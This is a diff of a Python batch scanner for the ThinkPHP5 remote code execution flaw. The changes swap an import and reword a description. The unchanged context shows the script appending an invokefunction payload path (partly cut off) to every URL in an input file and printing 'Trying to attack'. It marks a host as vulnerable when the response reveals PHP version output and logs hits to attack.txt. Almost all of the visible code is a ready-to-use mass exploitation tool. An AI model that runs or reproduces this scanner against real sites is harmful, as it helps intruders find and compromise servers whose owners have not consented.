@@ -27,7 +27,7 @@ ThinkPHP5 remote command execution vulnerability batch scan script
 """
 
 
-import requests
+from requests import get
 from argparse import ArgumentParser
 
 payload = "/?s=index/\\think\\app/invokefunction" \
@@ -64,7 +64,7 @@ def run(infile, outfile):
     for curl in url_list:
         target_url = curl + payload
         try:
-            response = requests.get(url=target_url)
+            response = get(url=target_url)
             print('[*] Trying to attack the url address is ' + target_url)
             if 'PHP Version' in str(response.text):
                 print('[+] Remote code execution vulnerability exists at the target address')
@@ -78,7 +78,7 @@ def run(infile, outfile):
 
 if __name__ == '__main__':
     parser = ArgumentParser(prog='ThinkPHP5 poc', usage='./batch_scan.py [options: -i] <input file root>',
-                            description="The ThinkPHP rce test")
+                            description="The ThinkPHP5 batch scan")
 
     parser.add_argument("-i", "--input", dest="infile", help="Batch scan path file")
     parser.add_argument("-o", "--output", dest="outfile", default="attack.txt",
